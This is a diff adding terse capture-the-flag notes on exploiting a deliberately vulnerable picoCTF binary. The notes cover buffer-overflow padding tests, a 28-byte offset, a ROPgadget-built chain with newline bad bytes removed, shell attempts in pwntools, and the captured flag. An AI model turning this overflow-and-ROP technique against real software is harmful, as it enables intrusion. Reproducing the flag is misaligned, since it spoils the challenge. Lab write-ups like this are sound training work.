@@ -1,0 +1,46 @@
+
+
+
+
+ROPgadget --binary vuln --ropchain
+
+
+echo $(python ~/p.py) | ./vuln
+
+[312177.369169] v[21170]: segfault at 8208e36 ip 0000000008208e36 sp 00000000ffa87a70 error 14
+
+-----
+
+needs padding
+
+python -c "print 'b'*32" | ./v; dmesg | tail -1
+
+Segmentation fault (core dumped)
+[313971.392983] v[22436]: segfault at 62626262 ip 0000000062626262 sp 00000000ffcd4250 error 14
+
+
+28 byte offset allows the ip to be changed
+
+-----
+
+need to interactivly use pwntools to send the code and catch the shell
+
+-----
+
+however this shell will crash on commands entered because newlines
+
+[+] Starting local process './vuln': pid 731558
+[*] Switching to interactive mode
+[*] Got EOF while reading in interactive
+$ ls
+[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 731558)
+[*] Got EOF while sending in interactive
+
+remove the newlines from the shellcode
+
+ROPgadget --binary vuln --ropchain --badbytes "0a"
+
+-----
+
+picoCTF{rOp_t0_b1n_sH_cb4c373e}
+
